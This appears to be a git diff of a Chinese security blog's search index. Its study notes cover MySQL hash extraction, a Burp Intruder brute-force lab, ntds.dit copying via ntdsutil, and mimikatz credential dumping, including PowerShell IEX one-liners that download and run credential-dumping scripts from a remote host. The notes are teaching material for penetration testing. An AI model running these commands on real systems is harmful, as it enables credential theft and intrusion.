+<p>MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询， 前者是MYSQL323加密，后者是MYSQLSHA1方式加密。 MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生存的是41位字符串，其中*是不加入实际的密 码运算中，MYSQLSHA1加密的密码的实际位数是40位</p>
+<h5 id="获取MYSQL密码"><a href="#获取MYSQL密码" class="headerlink" title="获取MYSQL密码"></a>获取MYSQL密码</h5><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p>
+<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.jpg"></p>
+<h5 id="Hash破解"><a href="#Hash破解" class="headerlink" title="Hash破解"></a>Hash破解</h5><ul>
+<li><a href="http://www.cmd5.com/">www.cmd5.com</a> </li>
+<li><a href="http://www.somd5.com/">www.somd5.com</a></li>
+</ul>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h6 id="SharpDecryptPwd"><a href="#SharpDecryptPwd" class="headerlink" title="SharpDecryptPwd"></a>SharpDecryptPwd</h6><p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.jpg"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用burp进行暴力破解</title>
+    <url>/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Burp的工作模式"><a href="#0x00-Burp的工作模式" class="headerlink" title="0x00 Burp的工作模式"></a>0x00 <strong>Burp的工作模式</strong></h3><p>​    在没有burp之前，客户端使用浏览器直接与服务器进行通信。有了burp之后，burp在客户端与服务器之间充当代理。这样，浏览器发送给服务器的请求就会被burp进行捕获，而burp和wireshark这种审计类工具相比，其强大之处在于不仅可以做审计工作，更可以对数据包进行修改并发送出去。使用了burp的结构如下图所示。</p>
+<span id="more"></span>
+
+<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.png"></p>
+<h3 id="0X01-暴力破解"><a href="#0X01-暴力破解" class="headerlink" title="0X01 暴力破解"></a>0X01 <strong>暴力破解</strong></h3><p>​    一般使用暴力破解都有两种原因：</p>
+<ol>
+<li><p>对这个漏洞的测试，人是可以完成的，即可穷举。</p>
+</li>
+<li><p>人可以完成，但是代价太大，或者太浪费时间。</p>
+<p>正是出于这样的问题，一些软件的出现帮助人完成了这些测试，这就是暴力破解的真正好处。在业界曾经有这样的一种看法，对于暴力破解的使用都不屑一          顾，因为大家觉得技术含量太低。但是，从实际的情况来看，因为用户使用弱口令情况太普遍，导致很多漏洞使用暴力破解都可以轻松拿下。</p>
+<p>暴力破解，最有价值的地方是在对字典的构造上，这是一门技术，需要长期的经验积累。</p>
+</li>
+</ol>
+<h3 id="0x02-Burp-Suite代理和浏览器设置"><a href="#0x02-Burp-Suite代理和浏览器设置" class="headerlink" title="0x02 Burp Suite代理和浏览器设置"></a>0x02 Burp Suite代理和浏览器设置</h3><p>​    当Burp Suite 启动之后，默认分配的代理地址和端口是127.0.0.1 ：8080,可以从Burp Suite的proxy选项卡的options上查看。</p>
+<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.png"></p>
+<h4 id="1-IE设置"><a href="#1-IE设置" class="headerlink" title="1. IE设置"></a>1. IE设置</h4><h5 id="1-启动IE浏览器"><a href="#1-启动IE浏览器" class="headerlink" title="(1)  启动IE浏览器"></a>(1)  启动IE浏览器</h5><h5 id="2-点击【工具】菜单，选择【Internet】选项"><a href="#2-点击【工具】菜单，选择【Internet】选项" class="headerlink" title="(2)  点击【工具】菜单，选择【Internet】选项"></a>(2)  点击【工具】菜单，选择【Internet】选项</h5><h5 id="3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。"><a href="#3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。" class="headerlink" title="(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。"></a>(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.png"></p>
+<h5 id="4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置"><a href="#4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置" class="headerlink" title="(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置"></a>(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.png"></p>
+<h5 id="5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面"><a href="#5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面" class="headerlink" title="(5)  这时，IE的设置已经完成，你可以访问 http://burp 将会看到Burp Suite的欢迎界面"></a>(5)  这时，IE的设置已经完成，你可以访问 <a href="http://burp/">http://burp</a> 将会看到Burp Suite的欢迎界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.png"></p>
+<h4 id="2-FireFox设置"><a href="#2-FireFox设置" class="headerlink" title="2. FireFox设置"></a>2. FireFox设置</h4><p>​    与IE的设置类似，在FireFox中，我们也要进行一些参数设置，才能将FireFox浏览器的通信流量，通过Burp Suite代理进行传输。详细的步骤如下：</p>
+<h5 id="1-启动FireFox浏览器，点击【工具】菜单，点击【选项】"><a href="#1-启动FireFox浏览器，点击【工具】菜单，点击【选项】" class="headerlink" title="(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】"></a>(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.png"></p>
+<h5 id="2-依次点击【高级】-【网络】【设置】"><a href="#2-依次点击【高级】-【网络】【设置】" class="headerlink" title="(2)    依次点击【高级】 【网络】【设置】"></a>(2)    依次点击【高级】 【网络】【设置】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.png"></p>
+<h5 id="3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"><a href="#3-在弹出的【连接设置】对话框中，找到“http代理”，填写127-0-0-1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。" class="headerlink" title="(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。"></a>(3)  在弹出的【连接设置】对话框中，找到“http代理”，填写127.0.0.1，端口填写8080，最后点击【确认】保存参数设置，完成FireFox的代理配置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.png"></p>
+<h4 id="3-Google-Chrome设置"><a href="#3-Google-Chrome设置" class="headerlink" title="3. Google Chrome设置"></a>3. Google Chrome设置</h4><p>​    Google Chrome使用Burp Suite作为代理服务器的配置步骤如下：</p>
+<h5 id="1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面"><a href="#1-启动Google-Chrome浏览器，在地址栏输入chrome-settings-，回车后即显示Google-Chrome浏览器的配置界面" class="headerlink" title="(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面"></a>(1)  启动Google Chrome浏览器，在地址栏输入chrome://settings/，回车后即显示Google Chrome浏览器的配置界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.png"></p>
+<h5 id="2-在搜索中搜索代理，点击进入"><a href="#2-在搜索中搜索代理，点击进入" class="headerlink" title="(2)  在搜索中搜索代理，点击进入"></a>(2)  在搜索中搜索代理，点击进入</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.png"></p>
+<h5 id="3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"><a href="#3-点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。" class="headerlink" title="(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。"></a>(3)  点击【更改代理服务器设置】，windows系统下将会弹出IE浏览器的代理设置，此时，按照IE浏览器的设置步骤，完成代理服务器的配置即可。</h5><h3 id="0x03-熟悉comparer，repeater，intruder模块"><a href="#0x03-熟悉comparer，repeater，intruder模块" class="headerlink" title="0x03 熟悉comparer，repeater，intruder模块"></a>0x03 <strong>熟悉comparer，repeater，intruder模块</strong></h3><h4 id="1-comparer模块"><a href="#1-comparer模块" class="headerlink" title="1.  comparer模块"></a>1.  comparer模块</h4><h5 id="1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。"><a href="#1-compare模块可以将不同的数据包-无论是请求包还是响应包-进行比较。-首先，我们添加一条请求到compare模块去。" class="headerlink" title="(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。"></a>(1)  compare模块可以将不同的数据包(无论是请求包还是响应包)进行比较。 首先，我们添加一条请求到compare模块去。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/11.png"></p>
+<h5 id="2-此时，compare模块，上下界面多了一条记录"><a href="#2-此时，compare模块，上下界面多了一条记录" class="headerlink" title="(2)  此时，compare模块，上下界面多了一条记录"></a>(2)  此时，compare模块，上下界面多了一条记录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/12.png"></p>
+<h5 id="3-使用同样的方法，我们在为comparer模块添加另外的一条记录"><a href="#3-使用同样的方法，我们在为comparer模块添加另外的一条记录" class="headerlink" title="(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录"></a>(3)  使用同样的方法，我们在为comparer模块添加另外的一条记录</h5><h5 id="4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）"><a href="#4-我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare-word（bytes是指文件按照字节流来进行比对）" class="headerlink" title="(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）"></a>(4)  我们用1和2进行对比，在两个视图中选择1和2，然后点击右下角的compare word（bytes是指文件按照字节流来进行比对）</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/13.png"></p>
+<h4 id="2-repeater模块"><a href="#2-repeater模块" class="headerlink" title="2.  repeater模块"></a>2.  repeater模块</h4><h5 id="1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了"><a href="#1-我们只需要将burp截取到的请求通过右键send-to-repeater就可以在repeater中进行操作了" class="headerlink" title="(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了"></a>(1)  我们只需要将burp截取到的请求通过右键send to repeater就可以在repeater中进行操作了</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/14.png"></p>
+<h5 id="2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"><a href="#2-进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。" class="headerlink" title="(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。"></a>(2)   进入到repeater之后，点击go按钮，右侧就会返回服务器的响。Go的次数没有限制，点击多少次go，burp就会把当前的请求页向服务器发送多少次。使用repeater的目的是进行重放攻击测试，看服务器是否会对重放测试做出反应。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/15.png"></p>
+<h4 id="3-Intruder-模块"><a href="#3-Intruder-模块" class="headerlink" title="3. Intruder 模块"></a>3. Intruder 模块</h4><p>在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景：</p>
+<ol>
+<li><p>标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。</p>
+</li>
+<li><p>提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。</p>
+</li>
+<li><p>模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p>
+</li>
+</ol>
+<h5 id="1-抓取登录框的数据包，并将数据包发送至Intruder模块"><a href="#1-抓取登录框的数据包，并将数据包发送至Intruder模块" class="headerlink" title="(1)  抓取登录框的数据包，并将数据包发送至Intruder模块"></a>(1)  抓取登录框的数据包，并将数据包发送至Intruder模块</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/16.png"></p>
+<h5 id="2-将需要爆破的参数标记"><a href="#2-将需要爆破的参数标记" class="headerlink" title="(2)  将需要爆破的参数标记"></a>(2)  将需要爆破的参数标记</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/17.png"></p>
+<h5 id="3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"><a href="#3-因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破" class="headerlink" title="(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破"></a>(3)  因为已知用户名是hetian，密码为50-100之间一个数，所以只要将pas参数标记，然后Positions内payload选择Number，从50-100，每次加一进行爆破</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/18.png"></p>
+<h5 id="4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it"><a href="#4-爆破后发现69返回长度不一样，查看response，发现回显you-got-it" class="headerlink" title="(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it"></a>(4)  爆破后发现69返回长度不一样，查看response，发现回显you got it</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/19.png"></p>
+<h5 id="5-返回网页，使用-用户名hetian-密码69-成功登录"><a href="#5-返回网页，使用-用户名hetian-密码69-成功登录" class="headerlink" title="(5)  返回网页，使用 用户名hetian 密码69 成功登录"></a>(5)  返回网页，使用 用户名hetian 密码69 成功登录</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/20.png"></p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>实验笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -811,185 +1055,89 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
       </tags>
   </entry>
   <entry>
-    <title>Windows密码凭证获取</title>
-    <url>/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
-    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Windows-Hash简介"><a href="#0x00-Windows-Hash简介" class="headerlink" title="0x00  Windows Hash简介"></a>0x00  Windows Hash简介</h3><h4 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h4><p>所谓哈希（hash），就是使用一种加密函数进行计算后的结果。这个加密函数对一个任意长度的字符串数据进行一 次数学加密函数运算，然后返回一个固定长度的字符串。 现在已经有了更新的NTLMv2以及Kerberos验证体系。</p>
-<p>Windows系统使用两种方法对用户的密码进行哈希处理，它们分别是LAN Manager（LM）哈希和NT LAN Manager（NTLM）哈希Windows加密过的密码口令，我们称之为hash，Windows的系统密码hash默认情况下一般由两部分组成：第一 部分是LM-hash，第二部分是NTLM-hash。</p>
+    <title>域内密码凭证获取</title>
+    <url>/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
+    <content><![CDATA[<h4 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h4><h3 id="0x00-活动目录数据库"><a href="#0x00-活动目录数据库" class="headerlink" title="0x00 活动目录数据库"></a>0x00 活动目录数据库</h3><blockquote>
+<ul>
+<li>由ntds.dit文件构成</li>
+<li>默认存储在所有域控制器上的%SystemRoot%\NTSD文件夹中</li>
+<li>只能通过域控制器进程和协议访问<br>ntds.dit：活动目录数据库，包括有关域用户、组和组成员身份的信息。它还包括域中所有用户的密码哈希值。</li>
+</ul>
+</blockquote>
+<p>为了保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。因此想要破解sam文 件与ntds.dit文件都需要拥有一个system文件。</p>
 <span id="more"></span>
 
-<p>Windows Hash格式：</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">用户名称<span class="symbol">:RID</span><span class="symbol">:LM-HASH</span>值<span class="symbol">:NT-HASH</span>值</span><br></pre></td></tr></table></figure>
+<p>由于Windows阻止对这些文件的标准读取或复制操作，因此必须使用特殊技术来获取副本。</p>
+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">NTDS.DIT	:	Windows<span class="symbol">\N</span>TDS<span class="symbol">\N</span>TDS.dit</span><br><span class="line">SYSTEM		:	Windows<span class="symbol">\S</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\S</span>YSTEM</span><br><span class="line">SAM			:	Windows<span class="symbol">\S</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\S</span>AM</span><br></pre></td></tr></table></figure>
 
-<p>LM哈希密码最大长度为14，密码长度超过14位使用NTLM哈希</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>2000</th>
-<th>xp</th>
-<th>2003</th>
-<th>Vista</th>
-<th>win7</th>
-<th>2008</th>
-<th>2012</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>LM</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td></td>
-<td></td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>NTLM</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-</tr>
-</tbody></table>
-<h4 id="Windows-认证基础"><a href="#Windows-认证基础" class="headerlink" title="Windows 认证基础"></a>Windows 认证基础</h4><p>Windows的认证包括三个部分： </p>
+<p>PS : SAM存储当前主机用户密码哈希</p>
+<p>​        NTDS.DIT存储这域内所有用户密码哈希        </p>
+<h3 id="0x01-获取NTSD-DIT"><a href="#0x01-获取NTSD-DIT" class="headerlink" title="0x01 获取NTSD.DIT"></a>0x01 获取NTSD.DIT</h3><h4 id="Volume-Shadow-Copy-Service"><a href="#Volume-Shadow-Copy-Service" class="headerlink" title="Volume Shadow Copy Service"></a>Volume Shadow Copy Service</h4><p>Volume Shadow Copy Service (VSS) 卷影复制服务是微软从 Windows XP 开始提供的用于创建一致性的时间 点副本（也就是快照）的服务框架。</p>
 <ul>
-<li><p>本地认证：用户直接操作计算机登陆账户 </p>
-</li>
-<li><p>网络认证：远程连接到工作组中的某个设备 </p>
-</li>
-<li><p>域认证：登陆到域环境中的某个设备</p>
-</li>
+<li>用于数据备份 </li>
+<li>支持Windows Server 2003 及以上操作系统 </li>
+<li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间 无法确定 </li>
+<li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li>
 </ul>
-<h4 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h4><ul>
-<li><p>用户输入密码 </p>
-</li>
-<li><p>系统收到密码后将用户输入的密码计算成NTLM Hash </p>
-</li>
-<li><p>与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对 </p>
-</li>
-<li><p>匹配则登陆成功，不匹配则登陆失败</p>
-</li>
-</ul>
-<p>本地认证中用来处理用户输入密码的进程为lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的</p>
-<h3 id="0x01-系统用户密码凭证获取"><a href="#0x01-系统用户密码凭证获取" class="headerlink" title="0x01 系统用户密码凭证获取"></a>0x01 系统用户密码凭证获取</h3><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><blockquote>
-<p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
-</blockquote>
-<h6 id="本地交互式"><a href="#本地交互式" class="headerlink" title="本地交互式"></a>本地交互式</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log res.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+<h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><h5 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">snapshot</span><br><span class="line">activate instance ntds</span><br><span class="line">create</span><br><span class="line"><span class="built_in">mount</span> [<span class="type">GUID</span>]			//<span class="built_in">copy</span> 完之后再执行</span><br><span class="line">unmout [<span class="type">GUID</span>]</span><br><span class="line"><span class="built_in">del</span> [<span class="type">GUID</span>]</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
 
-<h6 id="本地非交互式凭证获取"><a href="#本地非交互式凭证获取" class="headerlink" title="本地非交互式凭证获取"></a>本地非交互式凭证获取</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">mimikatz # log logon.txt</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br><span class="line">mimikatz # <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.png"></p>
+<h5 id="非交互式"><a href="#非交互式" class="headerlink" title="非交互式:"></a>非交互式:</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit		//创建快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit				//挂载快照</span><br><span class="line"><span class="built_in">copy</span> MOUNT_POINT\windows\ntds\ntds.dit c:\temp\ntds.dit			//复制ntds.dit</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit		//删除快照</span><br></pre></td></tr></table></figure>
 
-<h6 id="Powershell远程加载mimikatz脚本"><a href="#Powershell远程加载mimikatz脚本" class="headerlink" title="Powershell远程加载mimikatz脚本"></a>Powershell远程加载mimikatz脚本</h6><blockquote>
-<p><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object <span class="built_in">Net</span>.WebClient).DownloadString(&#x27;http://ip:prot/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure>
 
-<h6 id="Powershell加载Get-PassHashes脚本"><a href="#Powershell加载Get-PassHashes脚本" class="headerlink" title="Powershell加载Get-PassHashes脚本"></a>Powershell加载Get-PassHashes脚本</h6><blockquote>
-<p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object <span class="built_in">net</span>.webclient).downloadstring(&#x27;http://<span class="number">47</span>.x.x.<span class="number">85</span>/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>
 
-<h4 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">官网地址：https:<span class="regexp">//</span>www.ampliasecurity.com/research.html</span><br><span class="line"><span class="number">32</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x32.zip</span><br><span class="line"><span class="number">64</span>位下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>wce_v1_42beta_x64.zip</span><br><span class="line">历史版本下载：https:<span class="regexp">//</span>www.ampliasecurity.com<span class="regexp">/research/</span>windows-credentials-editor/</span><br></pre></td></tr></table></figure>
+<h4 id="Ntdsutil-InstallFromMedia"><a href="#Ntdsutil-InstallFromMedia" class="headerlink" title="Ntdsutil-InstallFromMedia"></a>Ntdsutil-InstallFromMedia</h4><h5 id="交互式：-1"><a href="#交互式：-1" class="headerlink" title="交互式："></a>交互式：</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full &lt;Drive&gt;:\&lt;Folder&gt;</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/1.jpg"></p>
-<h4 id="Pwddump7"><a href="#Pwddump7" class="headerlink" title="Pwddump7"></a>Pwddump7</h4><p>这款工具可以读取出当前系统的各个用户的密码hash (包括LM和NTLM)。 在命令行输入Pwddump7.txt就可以读取出hash并显示出来，也可以保存到一个文件中。</p>
